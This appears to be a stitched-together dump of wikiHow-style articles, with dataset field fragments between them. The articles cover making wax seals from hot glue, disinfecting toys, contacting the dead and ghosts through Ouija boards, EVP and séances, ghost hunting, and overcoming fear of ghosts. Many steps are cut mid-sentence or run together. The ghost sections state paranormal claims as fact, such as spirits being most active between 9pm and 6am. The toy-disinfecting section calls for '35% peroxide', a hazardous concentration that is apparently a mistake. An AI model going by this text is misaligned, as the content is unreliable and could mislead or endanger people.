, Try to get a wax stick made specifically for making wax seals. If you cannot find one, then you can use a crayon instead; just be sure to peel the paper away first. Hold the wax in one hand, and a lighter in the other. Ignite the lighter, and hold the wax up to it.


If you are using a wax stick that has a wick inside of it, light the wick, and let it burn for a few moments. You can also use a candle instead.

, Keeping the wax stick close to the flame, hold it directly above the paper. Let a few, big drops of wax drip onto the paper, until you get a puddle that is the same size as your seal.If you are using a candle or wicked wax stick, hold the candle/wax stick at a 45-degree angle above the paper.Black soot may get into your wax, especially if you are using a wicked stick. This is normal.

, Use the opposite end of your wax stick—the one that never got melted. Dip it into the puddle, and swirl it around. This will help give you a uniform color and thickness. It will also help get rid of any air bubbles., A quick and easy way to do this is to tap the base of the stamp against a damp sponge. This is very important. If you work with a dry stamp, the hot wax may get stuck to it.You can use a store-bought stamp meant for making wax seals, or you can make your own stamp using the methods above; do not use a rubber ink stamp.


Use cold water. If your stamp gets too hot, the wax won't cool down fast enough. It might also stick to your stamp.
If you are working with a non-metal stamp (such as a clay stamp), use oil instead.Any cheap oil, such as vegetable oil, will do.

, Hold your stamp over the wax, and peak under it. Make sure that the design or letter are facing the right direction, then press the stamp firmly into the wax.


To lessen the chances of sticking, let the wax cool for about 30 to 40 seconds first., During this time, the wax will start to cool and harden.

, If you feel a ""tug"" on the stamp, that means that the wax hasn't cooled enough. Don't pull the stamp away. Instead, hold it against the wax for a few more seconds, then try pulling it away again.If you try to pull the stamp away too soon, the design may not form properly.
Gently rotate the stamp around the wax before you pull it away. This will allow the wax to gently release the stamp., Even if the design the embedded clearly in the wax, the wax may still be hot and squishy. Don't touch or handle the seal until the wax cools completely. After this, your wax seal is complete.

Get a smooth, heat-safe surface.,
Allow the hot glue gun to heat up first.,
Make a coin-sized glob of hot glue on your work surface.,
Wait for the glue to cool for about 30 seconds.,
Press the stamp into glue, wait 30 to 60 seconds, then pull the stamp away.Don't worry if some of the glue or wax sticks to the stamp.,
Wait for the wax seal to cool all the way, then peel it off.,
Paint the stamp using acrylic paint.,
Use the wax seal.",How to Make a Seal4," You will be making your seal on this, and then peeling it off. Make sure that the surface is smooth, and that it can take heat. A silicone mat, a glass tile, or a plate would be ideal.You can also use a sheet of aluminum foil or a metal baking sheet.In a pinch, you can also use a sheet of paper.Keep in mind that, after you peel the seal away, some of the paper will cling to the back.
This method is great if you need to make a lot of wax seals.

, You can use plain hot glue sticks or colored hot glue sticks. Keep in mind that you can always paint your seal when you are done. Some arts and crafts stores also sell special wax sticks meant for hot glue guns and making wax seals; you can use one of those instead.


Crayons are not recommended, as they can damage your hot glue gun. If you do decide to use a crayon, gently push the it down into the hot glue gun, otherwise, it may leak out the sides.Consider placing your stamp on top of an ice pack. This will chill your stamp down, and help the hot glue seal set faster.Your stamp can chill while your hot glue heats up!

, It should be about the same size as your stamp. Keep in mind that the glue will spread about ⅛-inch (0.32 centimeter) after you press the stamp into it., During this time, you can also rub the surface of the stamp with some vegetable oil. This is especially recommended for stamps that are not made out of metal. Hot glue won't stick well to metal, but it will stick to other materials, including clay., This happens sometimes. Let the glue or wax harden up first, then pick it away with a pin or needle.


You can use a metal, store-bought stamp meant for making wax seals, or you can make your own stamp using one of the methods above.

, If you made yours on a sheet of paper, you will likely have bits of paper clinging to the back. This should not be a problem, since you will be gluing the seal onto another surface anyway.

, Unless you used a colored hot glue stick, your wax seal will turn out clear or frosted-white. If you want, you can paint it a more interesting color.Typical wax seal colors are red, black, or gold, but you can use any color you want.


If you oiled your stamp, you will need to wash the seal with soap and water, or the paint won't stick.If you are making a lot of seals, you can also spray paint them instead. Use a glossy color for the most realistic effect.

, Put a drop of hot glue onto the back of the wax seal, then press it onto a letter, roll of parchment, or envelope. You can also use it as a decoration for packages tied with ribbon or twine.


Be sure to use a low-temp hot glue gun for this; a high-temp hot glue gun will melt the seal.If you are shot on hot glue gun sticks, you can use glue dots instead."

Choose a cleaning solution.,
Pour the liquid into a container.,
Clean with a rag, washcloth, or sponge.,
Dip the cleaning item into the bucket.,
Wipe down the toy.,
Leave the toy out to dry.,
Wash out the bucket.",How to Disinfect Toys2," Bleach, alcohol, and ammonium based disinfectants are most common. Use a bleach-based product rather than alcohol or ammonium. There are, however, natural options too, like hydrogen peroxide and vinegar. Most solutions need to be mixed with water.Mix ½ cup of Clorox bleach per gallon of water, or mix a tablespoon in a quart of water for a cleaning solution.To use hydrogen peroxide, mix one cup of 35% peroxide with a gallon of hot water.Add one cup of vinegar to three cups of water for a natural solution.This solution works best on most items, except toys like stuffed animals.

, You should use a bucket or very large bowel to make the cleaning solution. It is easier to make the cleaning solution in the same container you will be using to clean. A plastic bucket is the best choice for the cleaning solution. Only use the container for cleaning purposes if possible., You should choose something that will only be used for cleaning purposes. Either pick a new item to be used for cleaning, or pick an old cleaning item that will no longer be used for anything else. If using an old rag or sponge, make sure it’s still useable and not too dirty., Make sure the rag, washcloth, or sponge is saturated. Wring it out to get rid of excess cleaning solution. You may need to dip the cleaning item in the bucket more than once while cleaning, depending on the size of the toy., Take the cleaning item of your choice and begin wiping down the toy. Wipe every part of the toy. Make sure not to miss any cranny, hole, or part that is not normally easily accessible wash. If you are using a rag or washcloth, put it around your finger, and use your finer to use the smaller parts of the toy., Put the toy out on a drying rack or surface once you are done wiping it down. Make sure the toy is out of reach from children. It needs to dry completely before it can be played with again. Wait about an hour for the toy to dry., Wipe down the bucket and any surface that has come in contact with the cleaner with water. Make sure to wash your hands thoroughly after you are done handling the cleaning solution, especially if you are dealing with bleach. Quickly rinse the toy with water after the cleaning solution has dried."
"
Choose a soap.,
Find a container to mix soap and water in.,
Dunk a rag into the water.,
Scrub the toy.,
Soak it in water.,
Dry the toy out.",How to Disinfect Toys3," This is the best solution for fabric toys and stuffed animals. You will need to purchase an antibacterial soap. It should kill bacteria, not just rinse it off. A few good brands of antibacterial soap are Palm Olive, Dial, Lysol, and Safeguard., You can mix soap and water in a bucket or sink. It is best to use a sink if one is available. Fill the container with warm water. Add a four or five drops of soap to the water. A lot of antibacterial soap is not need because it is strong.The water should have bubbles when you add the soap.

, Choose a rag that absorbs water. You should use for cleaning purposes only. Dip your rag into the water until it’s completely wet. Then, wring any excess water out of the rag., Disinfecting a toy with soap and water will probably taking more effort than wiping it down. Instead, gently scrub every part of the toy. Focus on scrubbing any stains, grime, and grease. The entire toy should be wet when you finish.Apply a little extra force when scrubbing difficult stains.
Scrub in gentle, circular motions.

, If the toy is still not as clean as you’d like, leave it to soak in the soapy water. The water should still be warm when you soak the toy. Soak the toy for a few hours or overnight. Allowing it to soak will loosen any stains that you could not remove by scrubbing.Scrub the toy down one more time when it is removed from the container after soaking.

, Allow the toy to dry out by putting it on a drying rack, or leaving it in an area where it will not be disturbed. If you want to expedite the drying process, place the toy the dryer for about fifteen minutes on a high setting.Put the toy in the dryer with a pack of fresh tennis balls to keep the stuffing from clumping.

Shift your focus to sharpen your sixth sense.If simply focusing on the image of your dead loved one is not enough form of connection, you could try a more structured method of shifting your focus to a higher realm.,
Attempt to talk through the power of your mind.Some paranormal experts believe that the ability to talk to the dead is not limited to professional mediums, but that the capability lies within anyone who can heighten his or her spiritual awareness.,
Ask for a response to simple questions.,
Work with a medium.,
Look into EVP and EMP technologies.An EVP, or Electronic Voice Phenomena, occurs when a voice that is not audible to the naked human ear gets recorded on a digital recording.,
Conduct a séance.,
Say prayers.,
Look into mirror gazing.,
Communicate with the deceased through a possession.,
Talk without asking for a reply.",How to Talk to the Dead,"


Make yourself consciously aware of what it feels like to be yourself in the present moment. Note your location, the time, and your feelings. Otherwise, it may make it difficult to return to your sense afterward.
Gradually bring your senses into ""soft focus,"" or a state of being in which you are less aware of the physical details around you.
Once your physical awareness goes down, focus on the energy surrounding you in the room. Do not look for it, but merely make yourself open to forces present in the room other than yourself. If you feel any presences, try asking questions. Be aware that any answers you do receive may not come as words, but as images or emotions.;
, It may take time and practice before you can connect to a dead loved one, but it is possible according to this theory.


Quiet yourself and clear your mind as though you are preparing to meditate. Sit in a location that is silent and free from distraction. Close your eyes and empty your mind of anxiety and thought.






Fix an image of your deceased loved one in your mind after you have cleared your mind of any other thoughts. Choose an image that is representative of that loved one according to the relationship you had with him or her. The more significant the image is to you, the easier it will be to establish a connection.






Ask your deceased loved one a question after you have held that person's image in your mind for several seconds. Keep your mind focused on that image and wait. Do not answer how you believe that person would answer. Instead, be patient until you receive a reply that you can be certain did not come from your own mind.







, This technique is not as useful for contacting dead loved ones, but it is a common practice used by paranormal investigators who are attempting to talk with spirits at a location that is haunted or potentially haunted. Go to a room in which the most paranormal activity takes place. Ask basic yes-or-no questions, and request a specific method of answering. The most common two methods of reply are knocking and flashlights.

For knocking, instruct any spirits in the room to give one knock for yes or two for no.






If using a flashlight, go with a flashlight that can be turned on easily, like one with a button on the end. Turn it on and unscrew the front section until the flashlight just barely goes off. Set it down on a flat surface and position it so that it cannot roll away on its own. Gently push on the power button and make sure that the light can flicker on and off. Instruct any spirits in the room to tap on the button once for yes or twice for no.







, Mediums are well versed in connecting with spirits of the dead. You can usually contact a medium by searching for one online or in a phone book. If you want to speak to a dead loved one, the medium may ask to meet at your home or may have you come to his or her place of work.


If you want a medium to speak to a spirit you believe to be in your home, the medium will need to come to your home. Not every medium will perform the latter service, but most will provide the former.
Be wary about the medium you choose to go to. Even those who are not skeptical about the practice of speaking to the dead will usually be willing to acknowledge that not every medium is legitimate. As with anything else, there are scam artists out there. Research a medium before scheduling an appointment with him or her and try to verify that he or she is the real deal. When you meet for your appointment, take note of whether or not the medium is leading you on with questions and having you provide the answers they claim to be offering.

, A EMP, or Electromagnetic Pulse, can only be registered using an EMP meter. To attempt either option, you should go to a room that is known to have high spiritual energy and ask questions there.

When looking for EVP, you can ask just about any question. This is the practice most commonly used when trying to find out a spirit's name or other unknown details. Ask your questions, providing a lengthy pause in between each so that any spirits there have time to answer. Replay the recording and listen carefully for any murmurs or unusual sounds that could translate into answers.






An EMP is usually limited to yes-or-no questions. The most commonly used EMP meter is a light-up device, which lights up when electromagnetic energy gets high. Ask your questions and instruct any spirits in the room that lighting up the meter once equals a yes, while lighting it up twice equals a no.







, A séance is a gathering of people who communicate with the dead using their collective energy. To perform one, you will need at least three people who are open to the experience. This practice can be used to talk to dead loved ones or wandering spirits. Be warned, however, that you do run a notable risk of contacting a malicious spirit.


Set the mood by dimming the lights and lighting candles. Use three candles, or a number of candles divisible by three. You may even light incense.






Have the participants hold candles around a table to create a circle. Perform a chant to call out to the spirits.






Alternatively, you may also attempt to call the spirits using a Ouija board.






Wait for a response, repeating your chant as necessary.






Once you make a connection, calmly ask your questions.






Break the séance by breaking the circle and putting the candles out.

, Not every faith has a practice you can use for praying to or for the dead, but some do. These prayers are often intercessory in nature and take two forms.


In the first, you are praying for the deceased loved one to find rest and joy in the afterlife, rather than to them specifically, but it might be with the knowledge that your dead loved one is listening or aware of your prayers.
In the second, you are praying to the deceased loved one. You are not asking for salvation from the spirit, but you are asking your loved one to intercede or pray for you from the other side. Some believe that, as a part of the spiritual realm, the spirit of someone who had strong faith in life will be able to make a more ardent plea or prayer for you to a deity from the other side.

, Mirror gazing is a practice some use in an effort to talk to dead loved ones. It is similar to trying to connect to the spirit using your mind, but in this practice, you use a mirror to help establish the connection more clearly.


Quiet your thoughts. Go to a silent room where you can be alone and stand in front of a mirror. Close your eyes and rid yourself of anxiety, intense emotion, or unrelated thought.
Focus your thoughts on the person you want to speak with. Create an image of that person in your mind. Make the image as clear as possible until you can practically see their features.
Open your eyes slowly and look into the mirror. Imagine that the image in your mind will appear in the mirror. Even if the image is blurry or overlaps with your own, you should be able to see the image of your deceased loved one in the mirror.
Ask your questions. Do not force answers, but be open to them. Also be aware of the fact that the answers may come as emotions or images rather than words.

, Some have found that objects owned by a deceased person are still connected to that person's spirit. Possessions can give you the power to call that person's spirit to you and make it possible to communicate. If you wish to talk with a loved one who has passed away, seek out an item of clothing, a book, or some other personal object that the person used. Take it to the place where the person lived or stayed. Hold the object and initiate a conversation., If you are hesitant or skeptical about talking to dead loved ones using paranormal or supernatural means, you can always talk to the dead without asking for an answer in return.For those who believe in the existence of spirits, it is also a common belief that those spirits may watch over living loved ones. You can talk to a deceased loved one anywhere, or you could choose a location that has special meaning, such as a grave or a place where you shared a memorable experience. Tell the person whatever is on your mind. You can ask questions, but since you are not looking for answers, you do not necessarily need to limit yourself to questions.

Acquire or create a Ouija board.,
Get a group of willing participants, or at least partner.,
Set the mood.,
Invoke the spirits by asking a question.,
Focus your energy on the communication.,
Be patient and be polite.,
End the conversation when it becomes appropriate.",How to Talk to Ghosts1," Also known as a spirit board, the Ouija board is basically just a flat surface with all the letters of the alphabet, the numbers 1-10, Yes/No, and ""Goodbye"" written on it.


You'll also need what's called a ""planchette,"" or some kind of movable indicator to use to point to the letters. A shot-glass is a common substitute, but any talisman you can all put your hands on to indicate the letters would be appropriate.
There's nothing magical about the Ouija board itself, so you should feel free to create your own on simple paper, or buy a more stylish one if you like.;
, You need more than one person to operate the Ouija board. It's best to have a relatively small group of people with a legitimate interest in communicating with the spirit world.


Designate one person and one person only to be the medium. This person will ask the questions aloud and be the one who is specifically communicating with the ghost, though both (or all) of you will have your hands on the planchette.
It might also be helpful to have at least one other person present to record the communications. If it gets moving very quickly, it can be difficult to keep up with the ghost's spelling. Having someone write it down will make sure you can keep up.

, Go into a quiet and comfortable part of the house in which you're communicating at an appropriate hour. Light the room softly with candles and consider cleansing it by burning sage or performing a brief cleansing prayer or other ritual appropriate to your beliefs.


The spirit world is most active between 9pm and 6am, so you might consider staging your communication during those hours, or another time of particular significance.
In some cultures, setting out a small amount of alcohol as an offering to the spirits can be helpful in attracting them.

, Place your fingers gently on the planchette in a central location on the board. Usually the letter ""G"" is a good starting place, equidistant from all points. Generally, a good opening question would be something like: ""Are there any benevolent spirits present who would like to communicate?""


Introduce yourselves and clarify your intentions. Say your names aloud and reassure any spirits of your curiosity and kind intentions: ""We want to listen to what you have to say.""

,


Some Ouija board users like to close their eyes, both as a way of focusing their energy on communicating and sensing the spirits present, as well as to ensure that none of the participants are ""cheating"" the board by moving it and spelling out the answers that another party wants to hear.
In general, ""cheating the board"" by moving the planchette on purpose is a big taboo and extremely disrespectful to both the other users and the spirits who may or may not be present.

, After making your question known and introducing yourselves, sit and wait. You might try asking different questions, but know that the spirit world has no obligation to communicate with you, and it might take a while.


If and when the planchette starts to move, remain calm and have the recorder start writing down the letters.
Treat it like a normal conversation. Ask follow up questions that you're legitimately curious about. Don't treat it like something the spirit needs to ""prove"" to you, forcing them to answer specific trivia questions or other ""test"" types of questions. Treat it like a person is present. Be polite and be courteous.

, You can move the planchette yourself over to the ""Goodbye"" section of the board to signal that you've chosen to end the conversation, but it's also best to say a few words aloud: ""Thank you for taking time to speak with us. Goodbye for now.""


Close the board and put it away when you're finished, to ensure communication will be cut off.

Get a good quality audio recorder.,
Go to the right environment.,
Start recording and clarify your intentions.,
Ask a series of questions.,
Pay close attention to other forms of communication you may be experiencing.,
Listen closely to the recording afterward.",How to Talk to Ghosts2," The basic principle of recording EVP is that you record yourself asking questions much as you would when using a Ouija board, and then listen back for audio cues that the spirits were answering out loud. It can be an intense experience to listen back over these sessions.


The H1 Zoom mic is a professional-quality handheld recorder that musicians and other people want to use to record spontaneous audio that sounds clear and clean. Cellphone recorders are also good for this kind of recording.
You want to make sure you can turn up the recording sensitivity to a very high level. EVP works best when it records things that are sub-aural for us to hear in the moment, catching things we might miss when we're present. A recorder that has an ultra-sensitive recording setting would be ideal.

, Finding a place with a lot of psychic residue would be a good candidate for trying to record EVP. Newer buildings and locations like shopping malls or housing developments will be less valuable for this activity, because they just don't have the kind of history that an old church, hospital, or library has.


If you live in a house that's more than 50 years old, give it a shot. If you don't it might be worth trying to hold an EVP session elsewhere.

, You should go through the same sort of process you might go through any time you try to connect to the great beyond: eliminate any distracts, unplug the clocks, make it as quiet as possible to get the highest-quality recording you can get. After you hit record, start talking:


""Is there any benevolent spirit here who might be interested in talking?""

, If you know anything about particular hauntings in the area you're researching, or anything about the history of the area, you might try asking specific questions or more general questions of the spiritual world that you're trying to get in touch with. You might try asking:


""What do you want?""
""Why are you here?""
""What would you like us to know?""
""Who are you?""
""Is there anything we can do for you?""

, While you're in the middle of recording, try to pay attention to any sensations you might be experiencing, emotional or physical. Make note of them in the recording itself for comparison afterward. Pay particular attention to:


Cold and warm spots
Tingles or prickles on the back of your neck
Feelings of apprehension
Any sounds or whispers you hear

, Leave the location by closing the conversation as you would any time you're communicating, with a brief salutation and thanks. Leave the location immediately and go to either a comfortable location or back to your house. Turn the lights back on and make it comfortable and as un-spooky as possible to listen.


Turn up the silent parts as loud as they'll go and listen closely. If you can look at the recording on the computer, pay attention to any spikes you see to know where to look more closely. Isolate those places in the recording and try to decipher what they say.

Before you go running off to find ghosts, make sure you know what you're looking for. You will want to research the common forms ghosts come in, and places where they are typically found.A basic definition of a ghost is a human or animal figure that has been seen, but can't be physically present.
When several unexplained experiences happen in one location, a haunting occurs. Hauntings are often associated with a specific location.;
, Familiarize yourself with the stories behind each place. Most of the stories will feature death and grisly details. Make sure you're comfortable doing this kind of research. In the last decade, there have been a string of self-published books on the local level which talk about hauntings in lesser known regions of the country.The Tax Assessor's Office can give you historical information about places in your area.

, If you see someone in ""old fashioned clothes,"" or a figure which looks transparent, it may not be a ghost. If you're in a locked room, alone, and you see a figure, it's much more likely that you've seen a ghost.Many accounts describe ghosts as being unaware of, or unconcerned with people. If the figure is doing something odd to get your attention, it may not be a ghost.

, There are two major types of spirits: lingering human presences and residual hauntings. The first type is 95% of ghosts, which are the typical relics of a human presence. The second is much more dangerous, a ghost which has stayed in the location for retribution. Talk to people who live nearby the location, or read their blog entries online. If they are talking about physical attacks, then most likely a residual haunting is present.The importance of this is that while residual hauntings are more dangerous, they are also more pronounced. This means that they will be easier to detect when you go on a ghost hunt.
If you decide to find a residual haunting, make sure to take extra safety precautions. This might mean wearing goggles, gloves, extra padding under your clothes, etc. Always carry a safety kit with you.
Often times people mistake dust, or creaks in the floor board for ghosts. You have to be extremely critical when it comes to determining whether what you see/hear is a ghost.

, There are paranormal societies all over the place, many of which conduct investigations. If you can't find a paranormal society in your area, check online and find a group to correspond with.A paranormal society does more than investigate hauntings. They work with the community to help those that have experienced a paranormal event.Paranormal societies will be able to help you determine the best places to look for ghosts, and what exactly to look for.

, The only way to test your ability to see ghosts is to go look for them. For the best results, find a place that has reports of ghost sightings. If you can't find a haunted place in your area, try visiting a graveyard.Don't go ghost hunting alone. Take some friends with you. Let someone who isn't going know where your group is investigating. This way you will have protection, as well as another pair of critical eyes.
Make sure you aren't trespassing on anyone's property. If you're going to be in an outside location, such as a graveyard, observe the posted rules. If you want to investigate private property, contact the owners to ask for permission. If they say no, then find another spot.
Visit the location during the day to get a feel for the place. You may want to plan an escape route in case of emergencies.

, You don't need fancy equipment to detect ghosts, though you may want to invest in some if you plan to do this often. For starters, a camera (video and picture), a flashlight, and a notebook should be just fine. An audio recorder is highly recommended. Don't forget a first-aid kit as well.Make sure you have a completely charged cellphone with you. However, keep your phone turned off so it doesn't interfere with any audio equipment you may be using.

, Walk around the area with your group and take note of the surroundings. Take pictures, start recording with audio devices, and make note of anything strange. Document the weather and what time you started investigating.Take turns investigating different areas to give everyone in your group an opportunity for discovery.
Ghost hunting can take a considerable amount of time and it's possible you may not get any real results. Keep an open mind and know that most of what you see is the result of a natural occurrence.Ask witness of their experiences with the paranormal at the location you chose. This can harrow down your focus so that you aren't looking everywhere for ghosts; you can focus on a couple of rooms.

, First, choose certain rooms you want to focus in. Place your video camera on a tripod in your top priority location. You can place audio recorders elsewhere in three or four places. Make sure that there is no visible or audible obstruction.Thermal scanners are great for detecting temperature variations in a room. Place one in a room where the temperature is room temperature, about 70 degrees. It will be easier to detect fluctuations here, rather than in a cold basement or hot attic.
You can use motion detectors as well. Place them on the wall about chest level. Once more, make sure that there is no obstruction.

, Look at every picture and read through all your notes. Share everything with your group. If you recorded anything, now is the time to watch and listen to it. Expect the review process to take at least as long as the investigation. It will probably take much longer.If you discover anything odd, compare it to your other notes. If you hear strange sounds in the audio, note the time. Cross-reference it with any video you may have recorded in the same area. Look at any photos taken at the same time.

, The review process is a long one. It's important to stay focused during analysis to ensure you don't miss anything important.Not everything odd will be paranormal. Most things you encounter will be natural occurrences. Don't jump to conclusions just because you want to discover something.

, In your effort to discover if a place is haunted, search for solid evidence. If you find something you believe to be paranormal, make a plan to return to the site. If you can observe the same activity again, you may have a lead.Go back and talk to some of the eyewitnesses. See if what you discovered matches what they have seen in the past.
Try different locations nearby. Set up cameras and sensors around the grounds. Go to nearby abandoned homes and see if the paranormal go from site to site.

, This usually means a change in the density or texture of the air. Just like heat waves move over the hood of a car on a hot summer day, so too will the air fluctuate as ghosts pass by. Keep the lights in the room dim. You can also use infrared lighting to see the waves more clearly.Keep your eyes open, without blinking for 15-20 seconds. You want to spend time just staying calm and looking.
Search in hot button areas. Don't stare for long periods of time unless you have a suspicion (sound, haunted history, gut feeling, etc.) that a ghost is present.

, These are commonly detected on mirrors, or next to windows. Different spirits that visit might express themselves in different colored tones of light. Look with your eyes to your right, while keeping your head forward. Your peripheral vision is most likely to detect these changes in light, especially when ghosts don't think they are being watched., Rather than appear in full body form, ghosts will often seek to change their appearance. This could be in the form of a shadow. Look at areas where you have lights set up. You may see dark marks go by, dimming certain areas. If you see shadows or movements, begin to calmly speak to the ghost.Ask them basic questions like ""Why are you here?"" and ""What is your name?"" Give them a minute to respond.
Ghosts might not respond, or respond in unusual ways. This could be by making a sound, or creating more movement through their shadow selves.

, Everybody is split between their Spirit and human physical body. It is almost impossible to train yourself to use your Spirit, or mind's eye, as it is largely a product of your subconscious. You need to know what to look for. Your mind's eye will detect certain images in flash form, like that of a camera. When you are in the presence of an allegedly haunted house, these images will appear as long-passed human beings.You can also detect images using your mind's eye through your imagination. Your Spirit works to create images in front of you which could be apparitions. Sit down and let your mind wander as you are in the haunted house. Daydreaming can relax your mind's eye, and allow it to be more susceptible to ghostly input.
Ghosts also like to influence memories. Think of some of your now dead, older relatives, such as your grandparents or great-grandparents. Ghosts like to flash before your mind's eye when they pick up on this.

, These usually will appear for a short time, around 3-15 seconds. Similarly to shadows, keep your head forward as you check your peripheral vision. Sometimes ghosts materialize from top to bottom, side to side, or only partially. Begin speaking to them, asking them to materialize again. Ask the ghosts ""What do you desire?"" ""Why are you here?"" and ""Is there anyone else here with you?"""

Protect yourself psychically.,
Find a charm.,
Avoid using alcohol or drugs.,
Burn sage incense.",How to Talk to Spirits1," If you try to contact the spirit world, you may come in contact with malevolent entities. Therefore, it’s important to strengthen your mind against negative energies before attempting to talk to spirits. For example:


Offer a prayer to the universe. While praying, ask for protection against malevolent spirits.
Visualize yourself as a column of white light that spreads throughout the room. This visualization will dissuade negative entities.
Mentally express an interest in communicating with positive spirits to draw them to you.;
, If you’re trying to contact a particular spirit, such as a deceased loved one, you will need a charm to draw them to you.A charm can be anything that the spirit owned while they were alive. Choose an item that held a lot of meaning for that person. Examples of meaningful items include:


Jewelry
Notebooks or journals
Photographs
A beloved book

, Alcohol and drugs affect your judgement and can make you more vulnerable to negative spirits. Additionally, some people believe that being intoxicated can attract harmful entities.If any of your friends are under the influence of alcohol or drugs, don’t let them participate in the session.

, Sage is an herb that is known for its aura cleansing properties. If you’re worried about the presence of malevolent spirits, burn some sage incense before contacting the spirit world. The sage will remove negative energies from the room and dissuade any unwanted visitors.Sage incense can be bought online or at specialty herbal supply stores.

Confront your fears.,
Ask yourself reasoning questions.,
Use humor to disarm your fear.,
Question the existence of ghosts.,
See a therapist.,
Assess your environment.,
Avoid watching scary movies.,
Develop a relaxing ritual.,
Build your self-esteem.,
Reaffirm your safety.,
Recognize the power of suggestion.,
Look for logical explanations.,
Accept coincidences.",How to Stop Fearing Ghosts and Paranormal Phenomena," If you're afraid of ghosts and you think there's a ghost in your home, your natural reaction is probably to run from it. However, studies show that avoiding your fears will only magnify those anxieties and intensify your reaction.Instead of giving in to your fears, try standing your ground and facing whatever it is you're frightened of.


Identify what you're actually afraid of and why.Ask yourself, ""What's the worst possible outcome if these fears were to come true?""
You should also consider why you have that fear in the first place - most anxieties are based on something much deeper, like a fear of being alone or dying.;
, Fear can often be unreasonable, so asking yourself some reasoning questions about the paranormal may help you feel better. If you do not know the answer to a question you pose, do some research and find out. Some questions you might ask yourself include:


What am I afraid will happen to me if I meet a ghost? Will it try to scare me, say “boo” like a cartoon, or do something annoying like open all the cabinets?
How likely is it that there is actually a ghost?
Can a ghost kill me? Is a ghost capable of harm at all, or is it just scary and annoying?
Is there a reasonable explanation for what happened that doesn't involve ghosts or the paranormal?

, Humor is a great way to defuse tense situations and take away the power that a fear has over you. You can use this technique in any situation whenever you're feeling afraid of ghosts or something paranormal.Try to make a point of imagining ridiculous, cartoonish ghosts and monsters. The more absurd you imagine these creatures, the less likely you are to be scared of them in the future.
Whenever you find yourself feeling anxious or fearful, think about how silly you've imagined the creatures you're afraid of. It's hard to be scared of a ghost when you picture ghosts as smiling, goofy caricatures.

, Once you've broken your fear of ghosts by imagining them as unthreatening beings, you can take another step towards disbelieving in ghosts altogether. Start to question what you believe about ghosts and ask yourself why you believe in these things.The easiest way to break your fear of ghosts and the paranormal is to question the proof you have of these phenomena.
Ask yourself honestly, ""What proof do I have that ghosts exist? Or that anything paranormal exists?""
Try to remember that you've been alive for years and you've never been haunted or attacked by a ghost. If you've made it this far without a real paranormal attack, it's safe to assume that you will never experience one.
You will quickly realize that most of your ""proof"" that ghosts exist was based on feelings and intuitions rather than concrete, observable facts. The fact is that while ghost hunters may exist, scientists do not recognize the existence of ghosts.

, Sometimes anxiety can be too much to manage alone. If your fear of ghosts and the paranormal is affecting your day-to-day life and you're having a hard time stopping those fears, you may want to consider seeing a therapist.


Therapy is usually recommended when long-standing fears and anxieties persist or worsen.Fear of the paranormal may be related to some traumatic event in your life. A therapist can help you identify the cause of your anxiety and work on resolving the underlying issue(s).

, Many people begin to fear ghosts and other paranormal phenomena when they feel unsafe in their immediate environment.For example, you may fear ghosts while walking alone in the park at night if you see a tree's shadow move in the moonlight. The fear puts you on heightened alert, even though there isn't actually anything there. One way to combat that fear is to find ways of reassuring yourself that you're in a ghost-free environment.When you're at home, make sure you lock the doors before going to bed at night. That way, if you think you hear something in the middle of the night, you'll know that there's no one inside your home.
Remove things that may frighten you. For example, if you have tree branches that scrape against the house, trim back the branches so you don't question what that sound is every time the wind blows.
Don't leave things hanging from the ceiling or in doorways at home. You may see these figures at night and frighten yourself into thinking that they're ghosts.
Try leaving a nightlight on when you turn the lights out. Having a light source may help disrupt your fears of what might be ""lurking"" in the dark., You may love horror films, but if you're afraid of ghosts you're better off avoiding the genre. Watching movies about ghosts and paranormal occurrences will only fuel your active imagination and give you more things to worry about.If you cannot avoid scary TV shows and movies, make sure you at least avoid watching them for about an hour before you go to bed.
Giving yourself a break from scary things before going to sleep will make you less likely to lie awake at night thinking about paranormal things.
Try to watch something light or funny before bed so that you go to sleep relaxed and amused rather than frightened.

, Fear of ghosts and the paranormal is often linked to anxiety. When you suffer from anxiety, it can be helpful to fall into a familiar ritual that calms your mind and relaxes your body.You can establish a relaxing ritual for any time of day, but at the very least you should find ways to relax before going to sleep.
Take time to unwind and de-stress, but be consistent in how frequently you follow this routine (ideally on a daily basis). Making your routine familiar helps you know what to expect each day, which can reduce your anxiety and uncertainty.You might try taking a warm bath or shower, going for a long walk, or trying relaxation techniques like yoga, meditation, or progressive muscle relaxation.

, Another way to help combat anxiety is by boosting your self-image. While this may not seem directly related to your fear of ghosts, studies have shown that boosting your self-esteem can help manage anxiety problems, including anxiety that is related to the paranormal.Recognize your strengths and accomplishments. By identifying what you're good at and the things you've achieved, you may start feeling stronger and better about yourself.Allow yourself to feel good about your achievements.
Turn your achievements into self-affirmations. For example, if you feel good about how you played basketball, allow yourself to really believe that you're a good player and a valuable team member.
You can also build your self-esteem and reassure yourself by telling yourself that you are capable of handling anything, even the unknown.

, At the end of the day, you need to remind yourself that you're safe from harm. Your fear of ghosts is probably tied to a fear of being by yourself, being in the dark, or even a fear of eventual death. By reaffirming that you're safe, you can help combat some of those anxieties when they arise in stressful moments.Remember that ghosts aren't real.
Even if you believed that ghosts were real, they are immaterial beings without physical bodies. Therefore, there is no way that a ghost (if it were real) could actually harm you or anyone else.
Your fears are most likely linked to some deeper, underlying anxiety that you haven't fully addressed. Managing your anxiety will help you feel safer and break out of your fear of ghosts.

, Studies show that even skeptics will begin to consider the existence of the supernatural if they believe they are involved in a paranormal investigation. If you're thinking about the paranormal and looking for ghostly explanations, even as someone who does not believe in these things, you will find yourself believing that you've witnessed something supernatural.Resist the urge to engage in superstitious activities like crossing yourself, crossing your fingers, knocking on wood, etc.
Wear a rubber band on your wrist. Whenever you find yourself engaging in ritualistic activities or believing in superstitions, snap the rubber band against your skin to bring your focus back to the present moment., Most people who think they've seen or heard a ghost do so in relatively unchanging environments where there is very little stimulation. The human brain looks for patterns and is equally capable of looking for breaks in those patterns. When the cause of some disruption cannot be explained, many people assume it is a ghost or something otherworldly.There is usually a logical explanation for whatever you're experiencing at any given time. Just because you can't see or understand it, that doesn't mean it's a ghost.
If you're worried that a ghost is in your home, you're probably just home alone and (subconsciously) looking for any break from the familiarity of your house.
Some other common scientific explanations for paranormal experiences include atmospheric/geomagnetic activity, altered states of consciousness, stress-induced changes in brain chemistry, and changes in hormone concentrations.

, Serendipity happens everywhere, every single day. There are many coincidences in the world, some of which you'll have a hard time explaining. However, just because you can't logically explain something, it doesn't mean that the explanation is supernatural or paranormal.Remember that there is no such thing as fate, luck, or paranormal intervention. The things that happen in life are governed by chance and the choices you make, not by ghosts.
